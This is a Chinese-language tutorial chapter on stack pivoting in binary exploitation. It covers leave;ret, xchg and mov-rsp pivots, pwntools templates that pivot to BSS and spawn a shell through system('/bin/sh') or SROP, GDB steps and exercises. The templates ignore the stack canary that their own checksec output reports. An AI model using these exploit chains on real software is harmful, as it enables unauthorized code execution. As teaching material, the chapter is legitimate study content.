---
title: "栈迁移（Stack Pivoting）"
type: docs
weight: 4
---

## 16.4 栈迁移（Stack Pivoting）

栈迁移是二进制漏洞利用中一项关键技术——当栈上可控空间不足以构造完整ROP链时，将栈指针（ESP/RSP）"迁移"到攻击者可控的内存区域（堆、BSS段、.data段或其他已知地址的缓冲区），从而获得远超原始栈空间的利用空间。这项技术在格式化字符串漏洞、受限栈溢出、ret2csu等复杂场景中频繁出现，是从入门到实战必须掌握的核心技能。

### 16.4.1 为什么需要栈迁移

#### 栈空间不足的典型场景

在理想情况下，栈溢出允许我们向栈上写入数百甚至数千字节的payload，足以构造任意复杂的ROP链。然而现实中经常遇到以下约束：

**场景一：溢出长度极短**

```c
// 只能溢出 8-16 字节，连一个完整的 gadget 都放不下
char buf[64];
read(0, buf, 80);  // 只溢出 16 字节 = saved_rbp(8) + return_addr(8)
```

在这种情况下，栈上只能覆盖 saved RBP 和返回地址，没有空间放置完整的ROP链参数。

**场景二：格式化字符串漏洞**

格式化字符串漏洞没有栈溢出，但可以通过 `%n` 等格式符向任意地址写入数据。如果我们能将栈指针指向一个精心构造的fake stack，就可以控制程序的执行流。

**场景三：ROP链需要传递大量参数**

某些利用链需要设置多个寄存器（`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9` 等）来调用 `execve("/bin/sh", NULL, NULL)`，这需要足够的栈空间来排列gadget及其参数。

**场景四：多阶段利用的第二阶段**

第一次利用已经将数据写入堆或BSS段，但需要将执行流切换到该区域才能继续利用。

#### 栈迁移的核心思想

```text
迁移前的栈布局（空间不足）：
高地址
┌──────────────────┐
│   调用者的栈帧    │
├──────────────────┤
│   saved RBP      │ ← RBP指向此处
├──────────────────┤
│   return addr    │ ← 只有1个可控位置
└──────────────────┘
低地址

迁移后的栈布局（空间充足）：
高地址
┌──────────────────┐
│   execve()参数   │
├──────────────────┤
│   pop rdi; ret   │
├──────────────────┤
│   "/bin/sh"地址  │
├──────────────────┤
│   pop rsi; ret   │
├──────────────────┤
│   0x0            │
├──────────────────┤
│   ... 更多gadgets │
├──────────────────┤
│   syscall addr   │
├──────────────────┤  ← RSP现在指向这里（新栈）
│   伪造的栈内容    │
└──────────────────┘
```

### 16.4.2 栈迁移的原理与机制

#### leave; ret 指令详解

栈迁移最经典的实现方式是利用 `leave; ret` 指令对。理解这两个指令的语义是掌握栈迁移的前提。

```asm
leave   ; 等价于：
        ;   mov rsp, rbp    ; 将RBP的值复制到RSP
        ;   pop rbp         ; 从栈上弹出8字节到RBP，RSP += 8

ret     ; 等价于：
        ;   pop rip         ; 从栈上弹出8字节作为返回地址
        ;   (实际是jmp到弹出的地址)
```

**关键洞察：** `leave` 指令的第一步是 `mov rsp, rbp`。如果我们能控制 RBP 的值（通过覆盖 saved RBP），就能让 RSP 指向任意地址。随后的 `pop rbp` 和 `ret` 指令将在新地址上执行，从而实现栈迁移。

#### 迁移过程的分步图解

假设程序存在栈溢出，且有一个 `leave_ret` gadget 可用：

```text
原始栈状态（函数即将返回）：
┌──────────────────────────┐
│      原始栈帧数据         │
├──────────────────────────┤
│  buffer[0..N-1]          │  ← 缓冲区
├──────────────────────────┤  ← offset = len(buffer)
│  覆盖为 new_stack_addr   │  ← 覆盖 saved RBP
├──────────────────────────┤
│  覆盖为 leave_ret addr   │  ← 覆盖 return address
└──────────────────────────┘
                              新栈（堆/BSS/可控区域）：
                              ┌──────────────────────────┐
                              │  addr of system()        │  ← RSP指向这里
                              ├──────────────────────────┤
                              │  return addr (e.g. exit) │
                              ├──────────────────────────┤
                              │  addr of "/bin/sh"       │
                              └──────────────────────────┘

执行过程：
1. ret → 跳转到 leave_ret gadget
2. mov rsp, rbp → RSP = RBP = new_stack_addr (我们覆盖的saved RBP)
3. pop rbp → RBP = [new_stack_addr], RSP = new_stack_addr + 8
4. ret → rip = [new_stack_addr + 8], 即我们布置的ROP链第一个gadget
```

#### xchg 与其他迁移方式

除了 `leave; ret`，还有其他指令可以实现栈迁移：

**xchg rsp/eax（32位）/ xchg rsp/rax（64位）：**

```asm
xchg rsp, rax   ; 交换RSP和RAX的值
ret
```

如果能控制 RAX 的值（例如通过 `pop rax; ret` gadget），就可以用 `xchg rsp, rax` 将栈指针切换到 RAX 指向的地址。

**mov rsp, [可控地址] 类的gadget：**

```asm
; 某些编译器或库函数中可能包含这样的序列
mov rsp, qword ptr [rbp+0x48]
pop rbx
pop r12
pop r13
pop r14
pop r15
pop rbp
ret
```

这种gadget从可控内存位置加载新的栈指针，适合通过格式化字符串预先写入目标地址的场景。

#### 三种迁移方式对比

| 方式 | 前置条件 | 优点 | 缺点 | 适用场景 |
|------|---------|------|------|---------|
| `leave; ret` | 能覆盖 saved RBP + 有 leave_ret gadget | 最常见、最可靠 | 需要 `leave_ret` gadget | 栈溢出空间小 |
| `xchg rsp, rax` | 能控制 RAX + 有 xchg gadget | 不依赖 saved RBP | 需要额外步骤控制 RAX | RAX 已被控制 |
| `mov rsp, [addr]` | 能在可控地址写入目标值 | 直接加载新栈指针 | gadget 罕见 | 格式化字符串 |

### 16.4.3 实战利用：完整步骤与代码

#### 步骤一：分析漏洞与约束

```bash
# 检查二进制安全属性
checksec ./vuln
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

# 确认溢出长度
# 分析 read() 或其他输入函数能写入多少字节
```

#### 步骤二：寻找可用的gadget

```bash
# 方法一：ROPgadget 工具
ROPgadget --binary ./vuln --only "leave|ret"
# 0x0000000000400699 : leave ; ret

ROPgadget --binary ./vuln --only "pop|ret"
# 0x00000000004007f3 : pop rdi ; ret

# 方法二：ropper 工具
ropper --file ./vuln --search "leave; ret"

# 方法三：ROPchain 自动搜索
ropgadget --binary ./vuln --ropchain
```

#### 步骤三：确定新栈地址

新栈地址的选择决定了整个利用是否成功：

```python
from pwn import *

elf = ELF('./vuln')

# 方案A：BSS段（最常用，地址固定且可读写）
new_stack = elf.bss() + 0x500  # 偏移一点避免与其他数据冲突
# BSS段通常足够大且权限为 rw-

# 方案C：利用泄露的堆地址（需要先泄露）
# 适用于 PIE 开启的场景
```

选择新栈地址时必须确认以下几点：

1. **地址可写**：`mprotect` 或进程权限表中该区域必须是 `rw-`
2. **空间充足**：至少需要几百字节来存放完整的ROP链
3. **地址已知**：PIE 关闭时 BSS 地址固定；PIE 开启时需要先泄露
4. **不会被覆盖**：避免选择程序运行中会被频繁修改的区域

#### 步骤四：构造payload

**场景A：有足够溢出覆盖 saved RBP**

```python
from pwn import *

context.arch = 'amd64'
elf = ELF('./vuln')
p = elf.process()

# 地址定义
leave_ret = 0x400699
pop_rdi   = 0x4007f3
system_plt = elf.plt['system']
bin_sh     = next(elf.search(b'/bin/sh'))
bss_stack  = elf.bss() + 0x500

# 构造新栈上的ROP链（先写入BSS段）
# 在BSS段布置：system("/bin/sh")
rop_chain  = p64(0)              # fake saved RBP（pop rbp 会弹出这个）
rop_chain += p64(pop_rdi)        # return address: pop rdi; ret
rop_chain += p64(bin_sh)         # rdi = "/bin/sh"
rop_chain += p64(system_plt)     # 调用 system("/bin/sh")

# 第一阶段：将ROP链写入BSS段
# （通常通过一次 read(0, bss_addr, size) 实现）
# 这里假设程序提供了多次输入机会

# 第二阶段：栈迁移
offset = 64                      # buffer 到 saved RBP 的偏移
payload  = b'A' * offset
payload += p64(bss_stack)        # 覆盖 saved RBP 为新栈地址
payload += p64(leave_ret)        # 覆盖 return address 为 leave; ret

p.send(payload)
p.interactive()
```

**场景B：溢出只能覆盖返回地址（无法直接覆盖 saved RBP）**

当溢出空间极小时（例如只能覆盖恰好一个返回地址的长度），需要使用两阶段利用：

```python
# 假设溢出只有 8 字节空间（刚好覆盖 return address）
# 此时无法直接覆盖 saved RBP，需要先通过程序原有逻辑控制 RBP

# 利用思路：
# 1. 第一次溢出：跳转到 leave_ret，此时 RBP 仍是程序原有的 saved RBP
# 2. 但这相当于在原栈上做了一次 leave; ret，没有迁移效果
# 3. 需要其他方式（如格式化字符串）先修改 saved RBP
```

#### 步骤五：完整利用模板

以下是一个通用的栈迁移利用模板，适用于最常见的场景：

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

def exploit():
    p = process('./vuln')
    elf = ELF('./vuln')
    
    # ---- Step 1: 定义关键地址 ----
    leave_ret  = 0x0000000000400699
    pop_rdi    = 0x00000000004007f3
    pop_rsi_r15 = 0x00000000004007f1
    
    system_plt = elf.plt['system']       # 如果有 system@plt
    # 或者使用 libc 中的 system
    # libc = elf.libc
    # system_addr = libc.symbols['system']
    
    bin_sh = next(elf.search(b'/bin/sh'))
    ret_gadget = 0x00000000004004fe      # 用于栈对齐
    
    # ---- Step 2: 确定新栈地址 ----
    new_stack = elf.bss() + 0x600
    
    # ---- Step 3: 在新栈上布置ROP链 ----
    # 地址: new_stack + 0x00  → fake saved RBP
    # 地址: new_stack + 0x08  → first return (pop rdi; ret)
    # 地址: new_stack + 0x10  → "/bin/sh" string addr
    # 地址: new_stack + 0x18  → system()
    
    rop  = b''
    rop += p64(0)                # fake saved RBP
    rop += p64(ret_gadget)       # 栈对齐（16字节对齐）
    rop += p64(pop_rdi)
    rop += p64(bin_sh)
    rop += p64(system_plt)
    
    # ---- Step 4: 发送ROP链到新栈 ----
    # 方法取决于程序的输入方式
    # 假设程序有两次 read() 调用
    p.sendafter(b'input:', rop)
    
    # ---- Step 5: 触发栈迁移 ----
    offset = 64  # buffer size
    payload  = b'A' * offset
    payload += p64(new_stack)    # 覆盖 saved RBP → 新栈地址
    payload += p64(leave_ret)    # 触发 leave; ret → 迁移
    
    p.sendafter(b'input:', payload)
    p.interactive()

exploit()
```

### 16.4.4 32位与64位的差异

栈迁移在32位和64位程序中的实现原理相同，但细节有显著差异：

| 差异项 | 32位（x86） | 64位（x86-64） |
|--------|------------|---------------|
| 寄存器 | ESP / EBP | RSP / RBP |
| 指针大小 | 4字节（p32） | 8字节（p64） |
| 参数传递 | 栈上传参 | 寄存器传参（rdi, rsi, rdx...） |
| leave 指令 | `mov esp, ebp; pop ebp` | `mov rsp, rbp; pop rbp` |
| 典型偏移 | 通常较小（0x20-0x88） | 通常较大（0x40-0x100+） |

**32位示例：**

```python
context.arch = 'i386'

new_stack = 0x0804a060  # BSS段地址（32位无PIE）
leave_ret = 0x08048455

# 32位直接传参到栈上
rop  = p32(0)               # fake saved EBP (pop ebp)
rop += p32(system_plt)      # return to system
rop += p32(0)               # system 的返回地址
rop += p32(bin_sh)           # 第一个参数 "/bin/sh"

# 栈迁移
payload  = b'A' * offset
payload += p32(new_stack)    # 覆盖 saved EBP
payload += p32(leave_ret)    # leave; ret
```

### 16.4.5 PIE 开启时的栈迁移

当 PIE（Position Independent Executable）开启时，所有代码段地址在每次运行时随机化。这给栈迁移带来了额外的挑战：

```bash
checksec ./vuln_pie
# PIE: PIE enabled
# 此时 BSS 段地址每次运行都不同
```

**应对策略：**

**策略一：泄露地址后利用**

```text
1. 通过信息泄露（如格式化字符串、栈上残留地址）泄露一个已知地址
2. 根据泄露的地址计算偏移，推算出 BSS 段或其他可控区域的地址
3. 执行正常的栈迁移
```

**策略二：利用堆地址**

```text
1. 堆地址在开启 ASLR 时仍然可以通过特定方式泄露
2. 将 ROP 链写入堆上
3. 用泄露的堆地址进行栈迁移
```

**策略三：利用 `ret2dl-resolve` + 栈迁移**

```text
1. 利用延迟绑定机制构造 fake ELF 结构
2. 结合栈迁移扩大利用空间
3. 在新栈上布置复杂的 dl-resolve 攻击链
```

### 16.4.6 格式化字符串 + 栈迁移

格式化字符串漏洞是栈迁移的经典应用场景之一。由于格式化字符串可以向任意地址写入数据，我们可以先将 ROP 链写入可控区域，再通过修改栈指针完成利用。

```python
from pwn import *

def fmt_write(addr, value, byte_width=8):
    """构造格式化字符串写入 payload"""
    if byte_width == 2:
        return f'%{value & 0xffff}c%{addr}$hn'.encode()
    elif byte_width == 4:
        return f'%{value & 0xffffffff}c%{addr}$n'.encode()
    # 使用 %hn 分段写入
    parts = []
    for i in range(0, 64, 16):
        chunk = (value >> i) & 0xffff
        if chunk:
            parts.append(f'%{chunk}c%{addr+i//16}$hn')
    return ''.join(parts).encode()

# 利用思路：
# 1. 通过格式化字符串泄露栈地址或 libc 地址
# 2. 计算出 BSS 段或堆的可控地址
# 3. 通过多次格式化字符串调用，将 ROP 链逐字节写入该地址
# 4. 通过格式化字符串覆盖 __malloc_hook 或 GOT 表项为 leave_ret
# 5. 触发栈迁移，执行 ROP 链
```

### 16.4.7 ret2csu 与栈迁移的结合

ret2csu（也称为 `__libc_csu_init` 利用）是一种利用通用 gadget 设置多个寄存器的技术。当寄存器参数较多时，ROP 链可能很长，栈迁移可以帮助扩大可用空间。

```python
# ret2csu 的通用 gadget 地址
csu_pop = 0x4007fa   # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
csu_call = 0x4007e0  # mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+rbx*8]

# 使用 ret2csu 调用 read(0, bss_addr, 0x200) 将 ROP 链写入 BSS 段
# 然后通过栈迁移跳转到 BSS 段执行
```

### 16.4.8 与 SROP 的结合

SROP（Sigreturn-Oriented Programming）通过伪造 Signal Frame 可以一次性设置所有寄存器。当栈上空间不足以存放完整的 Signal Frame 时，栈迁移是必要的前置步骤。

```python
from pwn import *

# SROP 需要构造一个完整的 sigcontext 结构（248字节）
# 如果栈上空间不足，先迁移到 BSS 段再构造

frame = SigreturnFrame()
frame.rax = 59          # sys_execve
frame.rdi = bin_sh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret

# 将 Signal Frame 写入新栈
rop_chain  = p64(0)              # fake saved RBP
rop_chain += p64(sigreturn_addr) # mov rax, 15; syscall (sigreturn)
rop_chain += bytes(frame)         # Signal Frame

# 先通过 read() 将 rop_chain 写入 BSS
# 再通过栈迁移执行
```

### 16.4.9 常见错误与调试技巧

#### 常见错误

**错误一：新栈地址未对齐**

```text
问题：新栈地址不是8字节对齐（64位）或4字节对齐（32位）
后果：movaps 等指令可能触发 SIGSEGV
修复：确保 new_stack % 8 == 0（64位）或 new_stack % 4 == 0（32位）
```

**错误二：新栈区域不可写**

```text
问题：选择了只读内存区域作为新栈地址
后果：写入时触发 SIGSEGV
修复：通过 vmmap 或 /proc/pid/maps 确认目标区域权限为 rw-
```

**错误三：新栈区域被程序使用**

```text
问题：选择的地址恰好是程序频繁读写的全局变量
后果：ROP 链被程序后续操作覆盖
修复：在 BSS 段末尾留出足够偏移，避免冲突
```

**错误四：忘记 fake saved RBP**

```text
问题：新栈上第一个8字节没有设置 fake saved RBP
后果：leave; ret 中 pop rbp 弹出的值是 ROP 链的第一个 gadget 地址
      导致 RBP 被破坏，后续如果函数用到 RBP 会崩溃
修复：在新栈起始位置放置一个合理的值（可以是0或任意可写地址）
```

**错误五：leave_ret gadget 地址错误**

```text
问题：覆盖的不是 leave; ret 的地址，而是其他指令
后果：执行流跳转到错误位置
修复：仔细确认 gadget 地址，用 objdump 或 GDB 验证
```

#### GDB 调试方法

```bash
# 在 leave; ret 处设断点
gdb-pwndbg> b *0x400699

# 运行程序，发送 payload 后命中断点
# 观察寄存器状态
gdb-pwndbg> i r rbp rsp
rbp    0x603600    ← 被覆盖为新栈地址（BSS段）
rsp    0x7fffffffe080    ← 当前栈指针

# 单步执行 leave (mov rsp, rbp)
gdb-pwndbg> si
gdb-pwndbg> i r rsp
rsp    0x603600    ← RSP 已迁移到新地址！

# 继续单步执行 (pop rbp)
gdb-pwndbg> si
# 观察 RBP 和 RSP 的变化

# 继续单步执行 (ret)
gdb-pwndbg> si
# 确认 RIP 跳转到了 ROP 链的第一个 gadget

# 查看新栈内容
gdb-pwndbg> x/10gx $rsp
0x603608:    0x00000000004007f3    0x0000000000601040
0x603618:    0x00000000004004e0    0x0000000000000000
```

```bash
# 检查内存映射确认 BSS 可写
gdb-pwndbg> vmmap
# 找到类似这样的行：
# 0x602000  0x603000 rw-p    1000 0  /path/to/vuln  [bss]
```

### 16.4.10 练习题与思考

**练习一：基础栈迁移**

给定以下程序，完成栈迁移利用：

```c
// gcc -o pivot pivot.c -no-pie -fno-stack-protector
#include <stdio.h>
void vuln() {
    char buf[32];
    puts("Input:");
    read(0, buf, 64);  // 溢出 32 字节
}
int main() {
    vuln();
    return 0;
}
// 提示：使用 leave; ret gadget 将栈迁移到 BSS 段
// 在新栈上布置 system("/bin/sh") 的 ROP 链
```

**练习二：极小溢出 + 栈迁移**

```text
假设 read 只能溢出 16 字节（刚好覆盖 saved_rbp + return_addr）
如何仅用这 16 字节完成一次栈迁移？
```

**练习三：思考题**

```text
1. 如果程序开启了 Full RELRO，栈迁移的利用方式有什么变化？
2. 如果 /proc/sys/kernel/randomize_va_space = 0（关闭 ASLR），
   栈迁移是否还有意义？
3. 如何利用栈迁移 + SROP 实现不需要 libc 的任意系统调用？
```

### 16.4.11 总结

栈迁移是将栈指针从受控空间不足的原始栈迁移到攻击者可控的更大内存区域的技术。其核心机制是通过覆盖 saved RBP 并触发 `leave; ret` 指令序列来重定向 RSP。

关键要点回顾：

1. **触发条件**：栈溢出覆盖 saved RBP + 有 `leave_ret` gadget
2. **迁移目标**：BSS段、堆、.data段等可读写区域
3. **核心原理**：`leave` 的 `mov rsp, rbp` 将 RSP 设置为我们控制的值
4. **常见组合**：栈迁移 + ret2csu、栈迁移 + SROP、格式化字符串 + 栈迁移
5. **调试关键**：在 `leave_ret` 处断点，观察 RBP→RSP→ROP链的转换过程

掌握栈迁移后，你就拥有了在受限环境中突破空间限制的能力——这是从"会用工具"到"理解底层机制"的重要一步。
